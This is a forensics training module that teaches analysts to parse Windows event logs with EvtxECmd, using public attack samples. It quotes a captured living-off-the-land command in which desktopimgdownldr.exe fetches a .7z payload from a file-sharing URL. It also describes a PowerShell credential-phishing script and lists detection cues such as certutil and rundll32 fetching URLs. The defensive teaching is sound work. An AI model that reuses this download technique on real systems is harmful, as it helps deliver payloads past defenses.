# Module 5 — Parsing Event Logs with EvtxECmd

**Deck mapping:** *Intrusion Hunting Playbook* → "The Investigation Lifecycle" / event-log foundations.
**Goal:** turn raw, hard-to-read Windows `.evtx` log files into one clean spreadsheet (CSV) you can sort, filter, search, and build a timeline from — the foundation every later module builds on.

---

## 1. Background — why this matters

### What a Windows Event Log actually is
Every time something happens on Windows — a user logs in, a program starts, a service crashes, a file is downloaded — the operating system can write a short, structured note about it called an **event**. Those events are stored in files ending in **`.evtx`** (the "x" means the modern XML-based format introduced in Windows Vista; older systems used `.evt`). You will usually find them under `C:\Windows\System32\winevt\Logs\`.

Each `.evtx` file is a **separate "channel"** — a stream of related events:
- **`Security.evtx`** — logons, privilege use, account changes (this is the investigator's goldmine).
- **`System.evtx`** — drivers, services, the OS itself.
- **`Application.evtx`** — normal apps.
- **`Microsoft-Windows-Sysmon/Operational.evtx`** — if **Sysmon** (a free Microsoft Sysinternals add-on) is installed, this channel records very detailed activity: every process start, network connection, file write, and more. Sysmon is the single most useful source for hunting, which is why most of this lab's samples are Sysmon logs.
- **`...BITS-Client/Operational.evtx`** — the **Background Intelligent Transfer Service**, the Windows component that downloads files quietly in the background (Windows Update uses it). Attackers abuse it too — you will see this below.

### How Windows produces an event (the real mechanism)
A program that wants to log something is called a **provider** (for example, "Microsoft-Windows-Sysmon" or "Microsoft-Windows-Security-Auditing"). The provider hands the event to the **Windows Event Log service** (`EventLog`, running inside `svchost.exe`). That service writes the record into the matching `.evtx` file on disk.

Here is the catch that makes raw `.evtx` hard to read: the file does **not** store nice English sentences. It stores the data as a compact **binary** structure plus a numeric **Event ID** (e.g. `1` = "a process was created", `4624` = "an account logged on"). The human-readable wording you see in Event Viewer is actually assembled at display time from a separate **message template** baked into the provider's DLL. So if you just `cat` an `.evtx` file you get binary garbage, and if you open thousands of them in Event Viewer you click forever. **We need a parser.**

### What an investigator proves with event logs
Event logs are the closest thing to a **flight recorder** for a Windows machine. With them you can prove:
- **What ran and when** (Sysmon Event ID 1 = process creation).
- **Who logged in, from where, and how** (Security 4624 = logon).
- **What was downloaded** (BITS 59/60, Sysmon 11 = file created).
- **What changed** (a new user, a stopped service, a cleared log).

Module 6 will let detection *rules* automatically flag the suspicious events for you. But before you can trust a rule — or hunt for something no rule covers — you need the **raw events as a flat table** you can read yourself. That is exactly what this module teaches.

---

## 2. What the tool does — EvtxECmd

**EvtxECmd** is a free, open-source command-line parser written by **Eric Zimmerman** (a well-known DFIR tool author; his tools are often called "the EZ Tools"). It does three things:

1. **Reads the binary `.evtx` format directly** — it does not need Windows or Event Viewer to read them — it runs natively on the lab VM in Git Bash.
2. **Flattens every event into one row** of a CSV (or JSON), no matter which channel it came from. Point it at a whole folder and it merges *all* the logs into a single sortable timeline.
3. **Applies "Maps"** to make the cryptic fields readable. A **Map** is a small community-written blueprint (a YAML file) that says, for a given provider + Event ID, "pull *this* XML field and label it `PayloadData1`, pull *that* one and call it `RemoteHost`," and so on. Without Maps you would get raw XML blobs; with them you get tidy columns like `LogonType`, `ExecutableInfo`, and `UserName`. The Maps are crowd-sourced and ship with the tool.

> **Plain-language summary:** EvtxECmd turns a pile of unreadable binary log files into one clean spreadsheet, and uses community "Maps" to label the important fields for you.

---

## 3. The scenario in this module's data

This module's `data/` folder contains **four small real `.evtx` samples** (from the public **EVTX-ATTACK-SAMPLES** library — see `data/README.md` for provenance and license). They were chosen to show EvtxECmd parsing **four different channels with four different event schemas**, and two of them tell **two halves of the same attack story**:

| File | Channel | Key Event IDs | What it represents |
|---|---|---|---|
| `sysmon_11_1_lolbas_downldr_desktopimgdownldr.evtx` | Sysmon | 1 (process), 11 (file create) | An attacker runs **`desktopimgdownldr.exe`** to download a file — a **LOLBAS** technique (see below). |
| `bits_lolbas_desktopimgdownldr_59_60.evtx` | BITS-Client | 59, 60 | The **other half** of the same attack: the actual download, performed by Windows' BITS service. |
| `security_4624_4625_logon_baseline.evtx` | Security | 4624 (logon ok), 4625 (logon failed) | A normal logon sequence — your **benign baseline** for comparison. |
| `powershell_4104_scriptblock.evtx` | PowerShell Operational | 4104 (script block) | A captured PowerShell script (a credential-phishing snippet) — a very different payload shape. |

**LOLBAS** = *Living Off the Land Binaries And Scripts*. It means the attacker abuses a **legitimate, signed Windows program that is already on the machine** to do something malicious, so nothing new and obviously-bad has to be dropped to disk. `desktopimgdownldr.exe` normally just sets your lock-screen wallpaper — but its `/lockscreenurl:` option will fetch *any* URL, so attackers use it as a quiet file downloader (just like the more famous `certutil.exe`).

---

## 4. Setup

Open **Git Bash** on the lab VM and change into this module's data directory:

```bash
cd module-05-evtx-evtxecmd/data
```
- **`cd module-05-evtx-evtxecmd/data`** — move into the folder holding this module's `.evtx` evidence. **Every command below is run from inside this folder**, so files are named with simple relative paths.
- All forensic tools (EvtxECmd, Chainsaw, Hayabusa, and the rest) are installed **natively on the lab VM and already on your `PATH`** — you call them directly by name in Git Bash, no container or Docker. The VM is kept **offline** (no network) so evidence never "phones home" and nothing can tamper with it.

---

## 5. Step-by-step walkthrough

### Step 1 — Parse the whole folder into one CSV
```bash
EvtxECmd -d . --csv . --csvf events.csv
```
- **`-d .`** — process a **d**irectory: every `.evtx` under `.` (recursively). Use **`-f one.evtx`** instead to parse a single **f**ile.
- **`--csv .`** — write CSV output into the `.` folder.
- **`--csvf events.csv`** — name the output **f**ile `events.csv`. (Without it EvtxECmd auto-names the file with a timestamp.)

**Expected output (trimmed):**
```
Processing sysmon_11_1_lolbas_downldr_desktopimgdownldr.evtx...
Record # 1 (Event Record Id: 305352): In map for event 1, Property ...ParentUser not found! Replacing with empty string
...
Total event log records found: 3
Processing powershell_4104_scriptblock.evtx...
Total event log records found: 2
Processing bits_lolbas_desktopimgdownldr_59_60.evtx...
Total event log records found: 5
Processing security_4624_4625_logon_baseline.evtx...
Total event log records found: 4
Processed 4 files in 0.49 seconds
```
> **About those `... not found! Replacing with empty string` lines — they are completely normal.** A Map sometimes expects a field (like `ParentUser`) that *this particular* event didn't include. EvtxECmd just leaves that column blank and keeps going. It is a note, not an error. (Notice the real summary line says `Errors: 0`.)

You now have one merged spreadsheet, **`events.csv`**, holding all 14 events from all four channels — already in a single sortable table.

### Step 2 — Look at the column headers
On the lab VM, open `events.csv` in Excel/LibreOffice/Timeline Explorer, or peek from the shell:
```bash
head -1 events.csv
```
The most useful columns:
- **`TimeCreated`** — when the event happened (your timeline axis).
- **`EventId`** — the numeric event type (1, 4624, 59, 4104 …).
- **`Provider` / `Channel`** — who logged it and into which log.
- **`Computer`** — the host the event came from.
- **`MapDescription`** — the friendly name the Map gives the event (e.g. "Process creation").
- **`PayloadData1`–`PayloadData6`** — the Map's pick of the most important fields for that event.
- **`ExecutableInfo`** — for process events, the full command line.

### Step 3 — Isolate the process-creation events (find the malicious command)
```bash
EvtxECmd -f sysmon_11_1_lolbas_downldr_desktopimgdownldr.evtx --csv . --csvf sysmon.csv
```
Same flags as Step 1, but **`-f`** targets just the one Sysmon file. Open `sysmon.csv` and read the **Event ID 1 (Process creation)** rows. You will see:
```
EventId 1  Process creation  @ 2020-07-03 08:47:20   Computer: MSEDGEWIN10
  ExecutableInfo = cmd /c desktopimgdownldr.exe /lockscreenurl:https://a.uguu.se/Hv0bgvgHGNeH_Bin.7z /eventName:desktopimgdownldr
  ParentProcess  = C:\Windows\System32\cmd.exe
EventId 11 FileCreate  @ 2020-07-03 08:47:21
  TargetFilename = C:\Users\IEUser\AppData\Local\Temp\Personalization\LockScreenImage\LockScreenImage_uXQ8IiHL80mkJsKc319JaA.7z
```
**Read it:** `cmd.exe` launched `desktopimgdownldr.exe` and told it to fetch `https://a.uguu.se/Hv0bgvgHGNeH_Bin.7z`. A `.7z` archive is **not** a lock-screen image — that mismatch is the giveaway. Event ID 11 then shows the downloaded file landing on disk in the Personalization folder. This is the LOLBAS download, captured from the Sysmon side.

### Step 4 — Confirm the download from the *other* log (the BITS channel)
This is the key teaching point: **one attack often spans several logs.** `desktopimgdownldr.exe` doesn't actually open the network socket itself — it asks the **BITS** service to do the transfer (BITS runs inside `svchost.exe`). So the proof of the download lives in a *different* channel. EvtxECmd already parsed it for you; filter to the BITS events:
```bash
# from your host:
grep -E ',59,|,60,' events.csv
```
You will see (cleaned up):
```
EventId 59  "BITS transfer has started"  jobTitle: Download LockScreen Image  URL: https://a.uguu.se/Hv0bgvgHGNeH_Bin.7z
EventId 60  "BITS transfer has stopped"  jobTitle: Download LockScreen Image  URL: https://a.uguu.se/Hv0bgvgHGNeH_Bin.7z
```
**Read it:** the **same URL** appears here that we saw in the Sysmon command line — independent corroboration from a second log that the file really was fetched, and by the BITS subsystem. This is what makes event-log analysis powerful: **two channels, one story.** (Event ID 59 = transfer started, 60 = transfer stopped/completed.)

### Step 5 — Read the benign baseline (logon events)
```bash
EvtxECmd -f security_4624_4625_logon_baseline.evtx --csv . --csvf logons.csv
```
The Security channel uses a totally different schema. Open `logons.csv`:
```
EventId 4625  Failed logon       Target: MSEDGEWIN10\IEUser  LogonType 2  (bad username or password)
EventId 4624  Successful logon   Target: MSEDGEWIN10\IEUser  LogonType 2
EventId 4624  Successful logon   Target: NT AUTHORITY\SYSTEM LogonType 5
```
**Read it:** one **failed** logon (4625) immediately followed by a **successful** one (4624) for the same user, both **LogonType 2 (interactive — at the keyboard)**. That is the perfectly ordinary "I fat-fingered my password, then typed it correctly" pattern. **LogonType 5** is a service starting. Nothing here is malicious — that is the point. You keep a baseline like this so you know what *normal* looks like before you call something abnormal. (Logon Types are explained in depth in Module 7.)

### Step 6 — See how a PowerShell script is captured (Event 4104)
```bash
grep -E ',4104,' events.csv
```
Event **4104** is **PowerShell Script Block Logging** — Windows records the *actual script text* PowerShell executed. One row in this sample is a Base64+GZip-compressed blob (a classic obfuscation wrapper); another is a readable `Invoke-LoginPrompt` function that pops a fake "Windows Security" password box to phish the user's credentials. EvtxECmd drops the whole script into the `PayloadData2`/`ScriptBlockText` field so you can read exactly what ran. (Module 9 is devoted to PowerShell.)

### Step 7 (optional) — JSON output
```bash
EvtxECmd -d . --json . --jsonf events.json
```
- **`--json .`** / **`--jsonf events.json`** — same idea as CSV, but emits **JSON** (one object per event, nested fields preserved). CSV is best for eyeballing in a spreadsheet and timelining; JSON is best for feeding another tool, a script, or a SIEM. Same data, different shape.

---

## 6. Reading the output — suspicious vs. benign

| Field | What it tells you | Suspicious when… |
|---|---|---|
| `ExecutableInfo` (cmdline) | exactly what ran | a signed Windows binary (`desktopimgdownldr`, `certutil`, `rundll32`) is fetching a URL or hitting `lsass` |
| `EventId` | the action type | 1 (proc), 11 (file write), 59/60 (download), 4624/4625 (logon), 4104 (PowerShell) cluster together in seconds |
| `TimeCreated` | ordering | a download, a file write, and a new process all within the same few seconds |
| `Computer` | which host | one host suddenly doing admin/network actions it never did before |

**Triaging false positives:** a single `desktopimgdownldr.exe` or BITS transfer is *not* automatically evil — Windows itself uses BITS constantly. What makes our sample malicious is the **combination**: a lock-screen tool pulling a **`.7z` archive** from a random file-sharing host (`uguu.se`), corroborated across two logs, landing in a Temp folder. Always judge the *context and the cluster*, not one event alone. Your benign baseline (Step 5) is exactly how you tell the difference.

---

## 7. Investigative narrative — the story the evidence tells

Putting the parsed events in time order, here is what happened on `MSEDGEWIN10`:

1. `cmd.exe` launched the trusted Windows binary **`desktopimgdownldr.exe`**, pointing its `/lockscreenurl` at `https://a.uguu.se/Hv0bgvgHGNeH_Bin.7z` (Sysmon Event 1).
2. Under the hood, that binary queued a **BITS** job titled "Download LockScreen Image," which fetched the same URL (BITS Events 59 → 60).
3. The downloaded `.7z` archive was written into the user's Personalization Temp folder (Sysmon Event 11).

An attacker used a **living-off-the-land** trick to pull a payload past defenses that only watch for "weird" programs — because everything here is signed Microsoft code. **EvtxECmd gave you the ground truth** to reconstruct it from two different logs. In Module 6 you will see detection rules flag exactly this kind of behavior automatically.

---

## 8. Try-it-yourself exercises

1. Run Step 1, then open `events.csv` and **sort by `TimeCreated`**. Write the 3-line story of the desktopimgdownldr attack from the merged timeline alone.
2. The Sysmon command line and the BITS job both contain the download URL. **Grep `events.csv` for the hostname `uguu.se`** — how many channels mention it? Why is corroboration across logs stronger than a single hit?
3. Use `get-data.sh` (on an online host) to pull the full **Execution** category from EVTX-ATTACK-SAMPLES, parse a few with `-d`, and find another LOLBAS downloader (try `certutil` or `rundll32` samples).
4. Re-run Step 1 with `--json` instead of `--csv`. Open both and decide: when would you hand the JSON to a teammate's script, and when would you want the CSV in Timeline Explorer?

---

## 9. Key takeaways

- `.evtx` files are **binary**; you must parse them. EvtxECmd reads them directly (no Windows needed) and merges every channel into **one sortable CSV/JSON**.
- **Maps** turn cryptic XML into labeled columns; the `...not found...` lines are normal notes, not errors.
- **`-d`** = whole folder (merged timeline), **`-f`** = one file; **`--csv`** for humans, **`--json`** for tooling.
- Real attacks **span multiple logs** — the desktopimgdownldr download showed up in *both* Sysmon and BITS. Corroboration across channels is how you build a case.
- Keep a **benign baseline** so you can tell abnormal from normal. EvtxECmd gives you the raw truth; Module 6's rules tell you *which* of those events to look at first.

---

## 10. Sources & further reading

- EvtxECmd & the EZ Tools Maps — Eric Zimmerman: <https://github.com/EricZimmerman/evtx> · Maps README: <https://github.com/EricZimmerman/evtx/blob/master/evtx/Maps/!!!!README.md>
- LOLBAS project — `Desktopimgdownldr`: <https://lolbas-project.github.io/lolbas/Binaries/Desktopimgdownldr/>
- SentinelLabs, "Living Off Windows Land – A New Native File 'downldr'": <https://www.sentinelone.com/labs/living-off-windows-land-a-new-native-file-downldr/>
- Microsoft Learn — Event 4624 (logon) reference: <https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4624>
- EVTX-ATTACK-SAMPLES (sample provenance) — @sbousseaden: <https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES>

---
*Next: [Module 6 — Sigma Hunting with Chainsaw & Hayabusa](../module-06-sigma-chainsaw-hayabusa).*
